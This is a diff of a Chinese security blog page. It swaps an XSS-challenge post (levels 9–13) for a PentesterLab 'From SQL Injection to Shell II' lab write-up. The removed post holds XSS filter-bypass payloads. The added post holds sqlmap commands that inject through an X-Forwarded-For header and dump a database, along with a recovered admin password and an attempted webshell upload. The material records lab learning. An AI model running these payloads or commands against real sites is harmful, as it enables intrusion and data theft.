@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="XSS," />
+  <meta name="keywords" content="Sqlmap,盲注," />
 
 
 
@@ -79,24 +79,30 @@
 
 
 
-<meta name="description" content="第九关mmp,不知道该怎么做 别人的答案： 12p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;amp;charset=utf-7 @charset=utf-7">
-<meta name="keywords" content="XSS">
+<meta name="description" content="最近在看《SQL注入攻击与防御》这本书，收获挺多的，唯一不爽的是感觉这本书太厚了。。。我看这类书没耐性，很少有从头看到尾的，一直都是当参考书来用。。。下面是看这本书练手的笔记">
+<meta name="keywords" content="Sqlmap,盲注">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS Challenges（二）">
-<meta property="og:url" content="http://nickzhoulin.github.io/2017/11/11/page171111/index.html">
+<meta property="og:title" content="From SQL Injection to Shell II">
+<meta property="og:url" content="http://nickzhoulin.github.io/2017/11/22/page171122/index.html">
 <meta property="og:site_name" content="想念初恋">
-<meta property="og:description" content="第九关mmp,不知道该怎么做 别人的答案： 12p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;amp;charset=utf-7 @charset=utf-7">
+<meta property="og:description" content="最近在看《SQL注入攻击与防御》这本书，收获挺多的，唯一不爽的是感觉这本书太厚了。。。我看这类书没耐性，很少有从头看到尾的，一直都是当参考书来用。。。下面是看这本书练手的笔记">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171111-03.JPG">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171111-04.JPG">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171111-05.JPG">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171111-06.JPG">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171111-07.JPG">
-<meta property="og:updated_time" content="2017-11-12T06:00:36.963Z">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-01.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-02.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-03.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-04.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-05.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-06.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-07.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-08.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-09.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-10.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-11.JPG">
+<meta property="og:updated_time" content="2017-11-22T15:43:57.426Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS Challenges（二）">
-<meta name="twitter:description" content="第九关mmp,不知道该怎么做 别人的答案： 12p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;amp;charset=utf-7 @charset=utf-7">
-<meta name="twitter:image" content="http://oz3okd76o.bkt.clouddn.com/20171111-03.JPG">
+<meta name="twitter:title" content="From SQL Injection to Shell II">
+<meta name="twitter:description" content="最近在看《SQL注入攻击与防御》这本书，收获挺多的，唯一不爽的是感觉这本书太厚了。。。我看这类书没耐性，很少有从头看到尾的，一直都是当参考书来用。。。下面是看这本书练手的笔记">
+<meta name="twitter:image" content="http://oz3okd76o.bkt.clouddn.com/20171122-01.JPG">
 
 
 
@@ -126,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://nickzhoulin.github.io/2017/11/11/page171111/"/>
+  <link rel="canonical" href="http://nickzhoulin.github.io/2017/11/22/page171122/"/>
 
 
 
 
 
-  <title>XSS Challenges（二） | 想念初恋</title>
+  <title>From SQL Injection to Shell II | 想念初恋</title>
   
 
 
@@ -259,7 +265,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://nickzhoulin.github.io/2017/11/11/page171111/">
+    <link itemprop="mainEntityOfPage" href="http://nickzhoulin.github.io/2017/11/22/page171122/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Nick">
@@ -276,7 +282,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">XSS Challenges（二）</h1>
+          <h1 class="post-title" itemprop="name headline">From SQL Injection to Shell II</h1>
         
 
         <div class="post-meta">
@@ -288,8 +294,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-11T20:22:50+08:00">
-                2017-11-11
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-22T21:59:08+08:00">
+                2017-11-22
               </time>
             
 
@@ -348,38 +354,37 @@
       
 
       
-        <h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>mmp,不知道该怎么做</p>
-<p>别人的答案：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;charset=utf-7 </div><div class="line">@charset=utf-7</div></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>试了，没有成功</p>
-<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p><img src="http://oz3okd76o.bkt.clouddn.com/20171111-03.JPG" alt=""></p>
-<p>尝试闭合标签</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171111-04.JPG" alt=""></p>
-<p>闭合后发现domain不见了，初步猜测是黑名单过滤</p>
-<p>注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;alert(document.domdomainain);&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171111-05.JPG" alt=""></p>
-<p>成功过关</p>
-<h4 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h4><p>插入<code>&lt;script&gt;</code>标签发现<code>&lt;script&gt;</code>变成<code>&lt;xscript&gt;</code></p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171111-06.JPG" alt=""></p>
-<p>尝试了下改变标签大小写，发现没用，正则表达式应该是加了<code>i</code>属性</p>
-<p>打算用其他标签的on事件试一下，发现on后面的内容变为了xxx</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171111-07.JPG" alt=""></p>
-<p>尝试用<code>&lt;a&gt;</code>标签<code>&lt;iframe&gt;</code>均以失败告终，感到无比的挫败，看了一下别人的答案</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;iframe src=&quot;javascr&amp;#09;ipt:alert(document.domain);&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
-<p>确实可以弹窗，但没有给下一关地址</p>
-<p>后来自己用了下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;a href=&quot;javas&amp;#13;cript:alert(document.domain);&quot; &gt;xss &lt;/a&gt;&lt;&quot;</div></pre></td></tr></table></figure>
-<p>Firefox下没有成功，IE下成功了</p>
-<h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><p>过滤掉 “s/[\x00-\x20\&lt;>\”\’]//g;”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`` onmousemove=alert(document.domain)</div></pre></td></tr></table></figure>
-<p>IE8下有效</p>
-<h4 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h4><p>又是别人的答案</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">background-color:#f00;background:url(&quot;javascript:alert(document.domain);&quot;);</div></pre></td></tr></table></figure>
-<p>亲测Firefox，Chrome,IE无效</p>
-<p>。。。。</p>
-<p>彻底丧失信心了，下次再继续做这个吧</p>
+        <p>最近在看《SQL注入攻击与防御》这本书，收获挺多的，唯一不爽的是感觉这本书太厚了。。。我看这类书没耐性，很少有从头看到尾的，一直都是当参考书来用。。。下面是看这本书练手的笔记<br><a id="more"></a></p>
+<p>####注入</p>
+<p>又是练习平台，今天这个是From SQL Injection to Shell II，可以通过这个网址下载<a href="https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/" target="_blank" rel="external">https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/</a></p>
+<p>下载好后搭建虚拟机就可以了</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-01.JPG" alt=""></p>
+<p>用ifconfig看一下ip,我这里ip是192.168.137.131</p>
+<p>放到浏览器访问一下</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-02.JPG" alt=""></p>
+<p>首先想到的是注入，先手工测试一下，什么<code>&#39;</code>,<code>and 1=1,</code>,<code>and 1=2</code>啊，发现都没什么用，有一个登陆页面</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-03.JPG" alt=""></p>
+<p>本想直接暴力猜解密码，后来想了想还是放弃了</p>
+<p>祭出神器Acunetix,扫描一下漏洞</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-04.JPG" alt=""></p>
+<p>啊哈！有盲注</p>
+<p>使用sqlmap进行盲注：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.137.131/cat.php?id=1&quot; --headers=&quot;X-Forwarded-For: *&quot; --dbs --batch</div></pre></td></tr></table></figure>
+<p>这里用到的是<code>X-Forwarded-For:</code>头</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-05.JPG" alt=""></p>
+<p>获得两个数据库，这里要用到的是<code>photoblog</code></p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-06.JPG" alt=""></p>
+<p>通过下面这个来获取数据库中全部数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.137.131/cat.php?id=1&quot; --headers=&quot;X-Forwarded-For: *&quot; -D photoblog --dump-all --batch</div></pre></td></tr></table></figure>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-07.JPG" alt=""></p>
+<p>获得账号:<code>admin</code> ，密码：<code>P4ssw0rd</code></p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-08.JPG" alt=""></p>
+<p>尝试用这个账号登陆，登陆成功</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-09.JPG" alt=""></p>
+<h4 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h4><p>登陆后发现有个增加图片的地方</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-10.JPG" alt=""></p>
+<p>又是文件上传，新建个php文件，插入一句话木马，直接上传，发现上传失败，又试了下burp suite拦截改名字、文件类型，均以失败告终</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20171122-11.JPG" alt=""></p>
 
       
     </div>
@@ -397,7 +402,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/XSS/" rel="tag"># XSS</a>
+            <a href="/tags/Sqlmap/" rel="tag"># Sqlmap</a>
+          
+            <a href="/tags/盲注/" rel="tag"># 盲注</a>
           
         </div>
       
@@ -410,8 +417,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/11/diary171111/" rel="next" title="日记 2017-11-11">
-                <i class="fa fa-chevron-left"></i> 日记 2017-11-11
+              <a href="/2017/11/20/diary171120/" rel="next" title="心情日记 2017-11-20">
+                <i class="fa fa-chevron-left"></i> 心情日记 2017-11-20
               </a>
             
           </div>
@@ -419,10 +426,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/11/12/page171112/" rel="prev" title="prompt(1) to win">
-                prompt(1) to win <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -560,7 +563,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#第九关"><span class="nav-number">1.</span> <span class="nav-text">第九关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第十关"><span class="nav-number">2.</span> <span class="nav-text">第十关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第十一关"><span class="nav-number">3.</span> <span class="nav-text">第十一关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第十二关"><span class="nav-number">4.</span> <span class="nav-text">第十二关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第十三关"><span class="nav-number">5.</span> <span class="nav-text">第十三关</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#上传webshell"><span class="nav-number">1.</span> <span class="nav-text">上传webshell</span></a></li></ol></div>
             
 
           </div>
